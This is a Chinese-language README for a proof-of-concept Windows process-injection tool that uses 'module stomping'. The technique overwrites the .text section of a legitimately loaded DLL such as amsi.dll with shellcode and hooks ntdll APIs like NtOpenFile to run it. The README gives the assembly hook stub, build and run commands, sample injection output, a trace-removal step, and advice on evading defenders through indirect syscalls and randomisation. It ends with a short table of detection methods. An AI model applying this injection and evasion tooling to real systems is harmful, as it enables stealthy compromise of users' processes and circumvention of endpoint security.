# Module Stomping - 模块践踏注入

## 技术概述

Module Stomping（模块践踏）是一种结合 **Module Loading（模块加载）** 和 **Threadless Injection（无线程注入）** 的高级代码注入技术。通过加载合法 DLL 并覆盖其 `.text` 节中的代码，避免了分配新的可疑内存区域，同时利用 API Hooking 触发执行。

## 核心原理

### 完整流程

```
1. 加载良性模块
   └─ CreateRemoteThread + LoadLibrary 加载合法 DLL（如 amsi.dll）

2. 查找 RX Hole
   ├─ 解析 PE 头，定位 .text 节
   ├─ 生成随机偏移（避免固定位置）
   └─ 计算 RX hole 地址

3. 写入 HookCode + Shellcode
   ├─ 修改内存保护 (RX -> RWX)
   ├─ 写入 HookCode（恢复 + 执行 + 跳转）
   ├─ 写入 Shellcode
   └─ 恢复内存保护 (RWX -> RX)

4. Hook API
   ├─ 读取目标 API 的原始 8 字节
   ├─ 将原始字节嵌入 HookCode
   ├─ 修改 API 前 5 字节为 call 指令（E8 XX XX XX XX）
   └─ call 指令跳转到 RX hole

5. 触发执行
   ├─ 目标进程调用被 hook 的 API
   ├─ 执行 HookCode：恢复原始 8 字节
   ├─ 调用 Shellcode
   └─ 跳回 API 继续执行

6. 清除痕迹
   ├─ 恢复 API 内存保护（RWX -> RX）
   └─ CreateRemoteThread + FreeLibrary 卸载模块
```

## 与 Threadless Inject 的区别

| 特性 | Threadless Inject | Module Stomping |
|------|------------------|-----------------|
| **Shellcode 位置** | ±2GB 范围内新分配内存 | 已加载模块的 .text 节 |
| **内存分配** | VirtualAllocEx | 无（利用现有内存） |
| **隐蔽性** | 中等（新分配内存） | 高（合法模块内存） |
| **清除 IOC** | 无法完全清除 | 可卸载模块删除痕迹 |
| **适用场景** | 通用注入 | 高对抗环境 |

## HookCode 结构

```asm
; HookCode (与 Threadless Inject 的 LoaderStub 相同)
pop    rax                      ; 获取返回地址
sub    rax, 0x5                 ; 计算 API 地址
push   rax                      ; 保存 API 地址
push   rcx                      ; 保存寄存器
push   rdx
push   r8
push   r9
push   r10
push   r11
movabs rcx, 0x1122334455667788  ; 原始 8 字节（占位符）
mov    [rax], rcx               ; 恢复原始字节
sub    rsp, 0x40                ; 栈对齐
call   shellcode                ; 调用 shellcode
add    rsp, 0x40                ; 恢复栈
pop    r11                      ; 恢复寄存器
pop    r10
pop    r9
pop    r8
pop    rdx
pop    rcx
pop    rax
jmp    rax                      ; 跳回 API
nop
```

## 编译与使用

### Windows (build.bat)

```batch
build.bat
```

### Linux/Git Bash (build.sh)

```bash
chmod +x build.sh
./build.sh
```

### 生成 Shellcode

```cmd
cd build

# 生成 calc.exe shellcode
generate_shellcode.exe calc

# 生成 messagebox shellcode
generate_shellcode.exe messagebox

# 生成所有 shellcode
generate_shellcode.exe all
```

### 运行注入

```cmd
# 基本用法
module_stomping.exe <PID> <shellcode.bin> <LoadedModule> <HookedModule> <HookedAPI>

# 示例：注入到 notepad.exe
start notepad
module_stomping.exe 1234 calc_shellcode.bin amsi.dll ntdll.dll NtOpenFile

# 触发执行：
#   在 notepad.exe 中打开文件（触发 NtOpenFile）
```

### 参数说明

- **PID**: 目标进程 ID
- **shellcode.bin**: Shellcode 文件路径
- **LoadedModule**: 要加载并践踏的 DLL（如 `amsi.dll`）
- **HookedModule**: 包含被 hook API 的模块（如 `ntdll.dll`）
- **HookedAPI**: 被 hook 的 API 函数（如 `NtOpenFile`）

## 推荐配置

### 合法模块选择

选择 .text 节较大的系统 DLL：

1. **amsi.dll** - Windows Defender AMSI（推荐）
   - .text 节约 50KB
   - 合法系统组件
   - 容易触发卸载

2. **winhttp.dll** - Windows HTTP 服务
   - .text 节约 150KB
   - 网络应用常用

3. **cryptsp.dll** - 加密服务提供商
   - .text 节约 30KB
   - 系统组件

### Hook API 选择

选择频繁调用的 ntdll.dll API：

1. **NtOpenFile** - 文件打开（推荐）
   - 打开文件对话框时触发
   - 触发频率高

2. **NtCreateFile** - 文件创建
   - 保存文件时触发

3. **NtQueryInformationProcess** - 进程查询
   - 任务管理器刷新时触发

4. **NtAllocateVirtualMemory** - 内存分配
   - 几乎所有操作都会触发

## 执行流程示例

### 步骤 1: 注入

```cmd
C:\> module_stomping.exe 5678 calc_shellcode.bin amsi.dll ntdll.dll NtOpenFile

[+] Module Stomping Injection
[+] Target PID: 5678
[+] Shellcode: calc_shellcode.bin
[+] Module to load: amsi.dll
[+] Hook target: ntdll.dll!NtOpenFile

[+] Shellcode loaded: 276 bytes

[+] Loading module amsi.dll into target process...
[+] Allocated memory for module name at 0000000002B40000
[+] Module loaded successfully
[+] Local module base: 00007FFE8A2D0000
[+] .text section: base=00007FFE8A2D1000, size=51200 bytes
[+] Random offset: 0x3A8C (14988 bytes)

[+] RX hole found at 00007FFE8A2D4A8C in amsi.dll

[+] NtOpenFile address: 00007FFE8C5E1234
[+] Original bytes: 4C 8B D1 B8 33 00 00 00
[+] Writing HookCode + Shellcode to RX hole...
[+] HookCode + Shellcode written successfully
[+] Hooking API NtOpenFile...
[+] API hooked successfully

[+] Injection complete!
[+] Waiting for callback...
[+] Trigger the hooked API (NtOpenFile) in the target process
```

### 步骤 2: 触发

在目标进程中执行操作（如打开文件），触发 `NtOpenFile` 调用 → 执行 shellcode（弹出 calc.exe）

### 步骤 3: 清除

```cmd
[?] Press ENTER when you receive a callback to restore memory protection...
<按回车>

[+] Restoring memory protection...
[+] API protection restored (RWX -> RX)

[?] Press ENTER to unload amsi.dll and remove IOCs...
<按回车>

[+] Unloading module amsi.dll...
[+] Module handle: 00007FFE8A2D0000
[+] Module unloaded successfully

[+] All IOCs removed!
[+] Module Stomping complete.
```

## OPSEC 改进建议

⚠️ **这是 POC，不可直接用于生产环境！**

### 必须修改的部分

1. **内存保护**
   - ✅ 已实现 RW → RX 恢复
   - ✅ 最后卸载模块删除痕迹

2. **API 调用**
   - ❌ 使用 CreateRemoteThread（高风险）
   - ✅ 改为 NtCreateThreadEx
   - ✅ 使用 Indirect Syscalls

3. **模块选择**
   - ❌ 硬编码 amsi.dll
   - ✅ 运行时动态选择
   - ✅ 检测 .text 节大小

4. **随机化**
   - ✅ 已实现随机偏移
   - ✅ 可增加时间抖动

## 防御检测方法

| 检测层面 | 方法 |
|---------|------|
| **模块完整性** | 监控系统 DLL 的 .text 节修改（如 amsi.dll） |
| **API Hook** | 检测 ntdll.dll 导出函数前 5 字节是否为 call 指令 |
| **内存扫描** | 扫描 RX 内存中的 shellcode 特征 |
| **行为监控** | 检测异常的 LoadLibrary + FreeLibrary 模式 |
| **模块卸载** | 监控短时间内加载又卸载的模块 |

## 技术特点

| 特性 | 描述 |
|-----|------|
| ✅ Threadless | 不使用 CreateRemoteThread 执行 shellcode |
| ✅ 无新内存分配 | Shellcode 位于已加载模块内存中 |
| ✅ 高隐蔽性 | 践踏合法模块，避免可疑内存区域 |
| ✅ 可清除 IOC | 卸载模块删除所有注入痕迹 |
| ❌ 仍使用 CreateRemoteThread | 用于加载/卸载模块（可替换为 NtCreateThreadEx） |
| ❌ 破坏模块完整性 | 覆盖 .text 节代码（可能导致模块崩溃） |

## 技术来源

- **原作者**: @_EthicalChaos_ (d1rkmtrr)
- **原仓库**: [d1rkmtrr/D1rkInject](https://github.com/d1rkmtrr/D1rkInject)
- **基于技术**: [CCob/ThreadlessInject](https://github.com/CCob/ThreadlessInject)
- **演示视频**: [YouTube](https://www.youtube.com/watch?v=z8GIjk0rfbI)

## 致谢

- [@_EthicalChaos_](https://github.com/d1rkmtrr) - D1rkInject 原始实现
- [@CCob](https://github.com/CCob) - ThreadlessInject 核心技术

## 参考链接

- [D1rkInject Repository](https://github.com/d1rkmtrr/D1rkInject)
- [ThreadlessInject Repository](https://github.com/CCob/ThreadlessInject)
- [Module Stomping - Elastic Security](https://www.elastic.co/blog/process-injection-module-stomping)
